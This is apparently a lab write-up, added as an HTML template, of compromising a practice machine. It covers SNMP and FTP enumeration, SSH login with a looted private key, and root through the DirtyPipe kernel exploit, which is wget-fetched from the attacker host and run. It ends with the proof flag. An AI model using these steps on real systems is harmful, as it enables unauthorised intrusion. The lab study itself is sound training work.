@@ -1,0 +1,190 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX149</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>                                                                                                                                 ┌──(kali㉿kali)-[~/tempo/OSCPB/149]
+└─$ cat tcp                                                              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 01:28 EST
+Warning: 192.168.192.149 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.192.149
+Host is up (0.11s latency).
+Not shown: 52557 closed tcp ports (reset), 12975 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
+|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
+|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.22 seconds</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/149]
+└─$ sudo nmap -p 161 -sU 192.168.115.149 --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 02:17 EST
+Nmap scan report for 192.168.115.149
+Host is up (0.10s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds</code></pre></div>
+
+<p class="text">SNMP is open on the target machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/149]
+└─$ snmpwalk -v2c -c public 192.168.115.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
+NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting <u>password</u> of <u>kiero</u> to the default value</code></pre></div>
+<p class="text">We got username kiero, and this sentence implies the password is weak.</p>
+<p class="text">I could logon to ftp with this credential.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/149]
+└─$ ftp 192.168.115.149
+Connected to 192.168.115.149.
+220 (vsFTPd 3.0.3)
+Name (192.168.115.149:kali): kiero
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||10095|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
+-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
+-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
+226 Directory send OK.</code></pre></div>
+
+<p class="text">There are id_rsa files. We can know the id_rsa is for john.</p>
+<div class="code-box"><pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ec
+    PFmSXxVEK8oO3qu2pxa/e4izXBFc= <u>john</u>@oscp</code></pre></div>
+
+
+<p class="text">I could use this to logon as john via ssh.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/149]
+└─$ ssh -i id_rsa john@192.168.115.149                                       
+The authenticity of host '192.168.115.149 (192.168.115.149)' can't be established.
+ED25519 key fingerprint is: SHA256:+JvlP/LRLQWmEwhQC82TMUUSG5DDU1rjdgracnb/Vrw
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:50: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.115.149' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
+john@oscp:~$ </code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found the kernel is old.</p>
+<div class="code-box"><pre><code>john@oscp:~$ uname -a
+Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</code></pre></div>
+
+<p class="text">Searching exploit code returned <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">this</a> vulnerability : DirtyPipe. I installed this on my local kali machine and upload them to the target machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/149/exp]
+└─$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits                                                  
+Cloning into 'CVE-2022-0847-DirtyPipe-Exploits'...
+remote: Enumerating objects: 27, done.
+remote: Counting objects: 100% (27/27), done.
+remote: Compressing objects: 100% (23/23), done.
+remote: Total 27 (delta 7), reused 9 (delta 2), pack-reused 0 (from 0)
+Receiving objects: 100% (27/27), 11.46 KiB | 1.15 MiB/s, done.
+Resolving deltas: 100% (7/7), done.
+
+┌──(kali㉿kali)-[~/tempo/OSCPB/149/exp]
+└─$ cd CVE*
+
+┌──(kali㉿kali)-[~/…/OSCPB/149/exp/CVE-2022-0847-DirtyPipe-Exploits]
+└─$ ls 
+compile.sh  exploit-1.c  exploit-2.c  README.md
+                                                                                                                                 
+┌──(kali㉿kali)-[~/…/OSCPB/149/exp/CVE-2022-0847-DirtyPipe-Exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre></div>
+
+<div class="code-box"><pre><code>john@oscp:~$ wget http://192.168.45.244/compile.sh
+--2025-12-03 07:28:26--  http://192.168.45.244/compile.sh
+Connecting to 192.168.45.244:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 71 [application/x-sh]
+Saving to: ‘compile.sh’
+
+compile.sh                       100%[=======================================================>]      71  --.-KB/s    in 0s      
+
+2025-12-03 07:28:26 (18.0 MB/s) - ‘compile.sh’ saved [71/71]
+
+john@oscp:~$ wget http://192.168.45.244/exploit-1.c
+--2025-12-03 07:28:35--  http://192.168.45.244/exploit-1.c
+Connecting to 192.168.45.244:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5364 (5.2K) [text/x-csrc]
+Saving to: ‘exploit-1.c’
+
+exploit-1.c                      100%[=======================================================>]   5.24K  --.-KB/s    in 0s      
+
+2025-12-03 07:28:36 (15.0 MB/s) - ‘exploit-1.c’ saved [5364/5364]
+
+john@oscp:~$ wget http://192.168.45.244/exploit-2.c
+--2025-12-03 07:28:38--  http://192.168.45.244/exploit-2.c
+Connecting to 192.168.45.244:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7752 (7.6K) [text/x-csrc]
+Saving to: ‘exploit-2.c’
+
+exploit-2.c                      100%[=======================================================>]   7.57K  --.-KB/s    in 0.003s  
+
+2025-12-03 07:28:38 (2.31 MB/s) - ‘exploit-2.c’ saved [7752/7752]</code></pre></div>
+
+
+<p class="text">I could easily make use of them.</p>
+<div class="code-box"><pre><code>john@oscp:~$ chmod +x compile.sh
+john@oscp:~$ ./compile.sh
+john@oscp:~$ ls
+RESET_PASSWD  a.out  compile.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  exploit.c  local.txt
+john@oscp:~$ chmod +x exploit-1
+john@oscp:~$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">I got root user.</p>
+<div class="code-box"><pre><code>cat proof.txt;whoami;id;hostname
+3d35ed57f5b2831866df7af67f65d886
+root
+uid=0(root) gid=0(root) groups=0(root)
+oscp</code></pre></div>
+
+
+</body>
+</html>
